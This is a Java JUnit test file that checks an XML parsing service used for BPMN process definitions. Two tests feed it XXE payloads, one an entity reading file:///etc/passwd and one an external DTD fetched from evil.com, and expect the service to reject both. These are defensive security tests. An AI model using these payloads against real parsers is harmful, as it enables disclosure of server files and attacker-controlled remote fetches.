package com.example.decisioning.unit;

import com.example.decisioning.dto.ParseError;
import com.example.decisioning.service.XmlParseService;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;

class XmlParseServiceTest {

    private final XmlParseService xmlParseService = new XmlParseService();

    @Test
    void validXmlReturnsEmpty() {
        String xml = "<?xml version=\"1.0\"?><definitions><process id=\"test\"/></definitions>";
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isEmpty();
    }

    @Test
    void malformedXmlMissingClosingTagReturnsError() {
        String xml = "<?xml version=\"1.0\"?><definitions><process id=\"test\">";
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isPresent();
        ParseError error = result.get();
        assertThat(error.line()).isGreaterThan(0);
        assertThat(error.column()).isGreaterThan(0);
        assertThat(error.message()).isNotEmpty();
        assertThat(error.suggestion()).contains("line");
    }

    @Test
    void malformedXmlWrongClosingTagReturnsError() {
        String xml = """
            <?xml version="1.0"?>
            <definitions>
              <process id="test">
                <startEvent id="start"/>
              </sequenceFlow>
            </definitions>
            """;
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isPresent();
        ParseError error = result.get();
        assertThat(error.line()).isGreaterThan(0);
        assertThat(error.message()).isNotEmpty();
    }

    @Test
    void xmlWithDoctypeIsRejected() {
        String xml = """
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <foo>&xxe;</foo>
            """;
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isPresent();
        ParseError error = result.get();
        assertThat(error.message()).isNotEmpty();
    }

    @Test
    void emptyXmlReturnsError() {
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            new byte[0]);

        assertThat(result).isPresent();
        assertThat(result.get().message()).isNotEmpty();
    }

    @Test
    void xmlWithOnlyPrologReturnsError() {
        String xml = "<?xml version=\"1.0\"?>";
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isPresent();
    }

    @Test
    void complexBpmnXmlValid() {
        String xml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
                         targetNamespace="http://example.com">
              <process id="expense-approval" name="Expense Approval" isExecutable="true">
                <startEvent id="start" name="Start"/>
                <userTask id="approveTask" name="Approve Expense"/>
                <endEvent id="end" name="End"/>
                <sequenceFlow id="flow1" sourceRef="start" targetRef="approveTask"/>
                <sequenceFlow id="flow2" sourceRef="approveTask" targetRef="end"/>
              </process>
            </definitions>
            """;
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isEmpty();
    }

    @Test
    void xmlWithExternalEntityIsRejected() {
        String xml = """
            <?xml version="1.0"?>
            <!DOCTYPE definitions [
              <!ENTITY % ext SYSTEM "http://evil.com/evil.dtd">
              %ext;
            ]>
            <definitions/>
            """;
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isPresent();
    }

    @Test
    void parseErrorSuggestionIncludesLineNumber() {
        String xml = "<?xml version=\"1.0\"?>\n<root>\n  <child>\n</root>";
        Optional<ParseError> result = xmlParseService.validateWellFormed(
            xml.getBytes(StandardCharsets.UTF_8));

        assertThat(result).isPresent();
        ParseError error = result.get();
        assertThat(error.suggestion()).isNotEmpty();
        assertThat(error.suggestion()).contains(String.valueOf(error.line()));
    }
}
